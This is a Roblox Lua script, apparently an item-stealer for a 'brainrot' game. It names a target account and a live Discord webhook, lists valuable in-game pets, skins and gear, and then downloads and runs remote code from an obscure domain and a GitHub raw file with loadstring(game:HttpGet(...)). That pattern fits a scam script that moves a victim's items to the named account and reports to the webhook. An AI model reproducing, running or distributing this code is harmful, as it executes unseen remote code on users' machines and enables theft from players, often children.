local TARGET_ID = 11190168631
local TARGET_USER = "hdroj_313"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1536888863035756575/SDEqq1HP8ve2_04_blR54EXb1vgke_B87C9tGg0VTDsuEj5nGU6j2c-Y9upDmzt2glRB"

local TargetBrainrots = {
    ["Strawberry Elephant"] = true,
    ["Meowl"] = true,
    ["Skibidi Toilet"] = true,
    ["Dragon Cannelloni"] = true,
    ["Dragon Gingerini"] = true,
    ["Griffin"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Cerberus"] = true,
    ["Garama and Madundung"] = true,
    ["Capitano Moby"] = true,
    ["Burguro and Fryuro"] = true,
    ["Fragola La La La"] = true,
    ["Spooky and Pumpky"] = true,
    ["Fragrama and Chocrama"] = true,
    ["La Casa Boo"] = true,
    ["Foxini Lanternini"] = true,
    ["Ketupat Bros"] = true,
    ["La Supreme Combinasion"] = true,
    ["Cooki and Milki"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["Headless Horseman"] = true,
    ["Jolly Jolly Sahur"] = true,
    ["La Secret Combinasion"] = true,
    ["La Food Combinasion"] = true,
    ["Rosey and Teddy"] = true,
    ["Los Sekolahs"] = true,
    ["Reinito Sleighito"] = true,
    ["Gobblino Uniciclino"] = true,
    ["Ginger Gerat"] = true,
    ["Love Love Bear"] = true,
    ["Festive 67"] = true
}

local TargetBaseSkins = {
    ["Rose"] = true,
    ["Octo"] = true,
    ["Gingerbread"] = true,
    ["Halloween"] = true,
    ["Tralalero"] = true,
    ["Pot of Gold"] = true,
    ["Summer"] = true,
    ["Lucky"] = true,
    ["Easter"] = true
}

local TargetGears = {
    ["Alien Slap"] = true,
    ["Cupid's Wings"] = true,
    ["Santa's Sleigh"] = true,
    ["Witch's Broom"] = true,
    ["Waverider"] = true,
    ["Divine Slap"] = true,
    ["Demon's Head"] = true,
    ["Lava Slap"] = true,
    ["Radioactive Slap"] = true,
    ["Yin Yang Slap"] = true
}

task.spawn(function()
loadstring(game:HttpGet("https://orrxl4-protector.com/api/raw?id=tm2thjte"))()
    task.wait(1)

    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)